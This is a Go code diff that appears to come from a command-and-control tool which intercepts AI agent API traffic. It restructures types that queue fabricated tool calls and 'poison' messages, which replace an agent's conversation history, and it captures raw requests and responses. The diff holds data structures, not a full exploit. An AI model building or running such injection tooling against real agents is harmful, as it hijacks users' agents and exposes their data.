@@ -24,32 +24,33 @@ type Session struct {
 	LastActivity time.Time                 `json:"last_activity"`
 	Tools        []observedtools.ObservedTool `json:"tools"`
 
-	mu              sync.Mutex
-	pending         []*PendingCommand
-	pendingMessages []*PendingMessage
-	poisonActive    bool
-	inflightTaskIDs []uint32 // FIFO of C2 task IDs for dequeued commands awaiting results
-	subscribers     map[string]chan *CommandResult
-	observers       map[string]chan *ObserveEvent
+	mu               sync.Mutex
+	pendingActions   []*PendingAction
+	poisonTaskID     uint32 // 0 = no active poison, >0 = active poison with this taskID
+	processedCallIDs map[string]bool // call_ids already published (prevents re-capture)
+	subscribers      map[string]chan *CommandResult
+	observers        map[string]chan *ObserveEvent
 }
 
-// PendingMessage represents a natural-language message waiting to be injected
-// into the next agent request (poison module). Unlike PendingCommand which
-// injects tool calls into the response, PendingMessage replaces the request's
-// conversation history with a single user message.
-type PendingMessage struct {
-	ID        string    `json:"id"`
-	TaskID    uint32    `json:"task_id,omitempty"`
-	Text      string    `json:"text"`
-	CreatedAt time.Time `json:"created_at"`
-}
+// ActionType distinguishes tool-call injections from poison (natural-language) injections.
+type ActionType int
 
-// PendingCommand represents a command waiting to be injected into the next agent request.
-type PendingCommand struct {
+const (
+	// ActionToolCall injects a fabricated tool call into the response.
+	ActionToolCall ActionType = iota
+	// ActionPoison replaces the request's conversation history with a user message.
+	ActionPoison
+)
+
+// PendingAction represents an action waiting to be injected into the next agent request.
+// It unifies the previously separate PendingCommand and PendingMessage types.
+type PendingAction struct {
 	ID        string         `json:"id"`
-	TaskID    uint32         `json:"task_id,omitempty"` // C2 server task ID for response routing
-	ToolName  string         `json:"tool_name"`
-	Arguments map[string]any `json:"arguments"`
+	TaskID    uint32         `json:"task_id,omitempty"`
+	Type      ActionType     `json:"type"`
+	ToolName  string         `json:"tool_name,omitempty"`  // ActionToolCall
+	Arguments map[string]any `json:"arguments,omitempty"`  // ActionToolCall
+	Text      string         `json:"text,omitempty"`       // ActionPoison
 	CreatedAt time.Time      `json:"created_at"`
 }
 
@@ -64,11 +65,12 @@ type CommandResult struct {
 
 // ObserveEvent represents a captured request or response for real-time observation.
 type ObserveEvent struct {
-	Type      string    `json:"type"`       // "request" | "response"
-	SessionID string    `json:"session_id"`
-	Format    string    `json:"format"`     // "openai" | "claude" | "openai-responses"
-	RawJSON   string    `json:"raw_json"`
-	Timestamp time.Time `json:"timestamp"`
+	Type       string    `json:"type"`                  // "request" | "response"
+	SessionID  string    `json:"session_id"`
+	Format     string    `json:"format"`                // "openai" | "claude" | "openai-responses"
+	RawJSON    string    `json:"raw_json"`
+	StatusCode int       `json:"status_code,omitempty"` // HTTP status code (responses only)
+	Timestamp  time.Time `json:"timestamp"`
 }
 
 // SessionSummary is a lightweight view of a session for listing.
@@ -154,4 +156,11 @@ func (s *Session) RecordTools(rawJSON []byte, format string) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
 	s.Tools = parsed
+}
+
+// RecordToolsDirect sets the session's tools from a pre-built slice (for testing).
+func (s *Session) RecordToolsDirect(tools []observedtools.ObservedTool) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	s.Tools = tools
 }
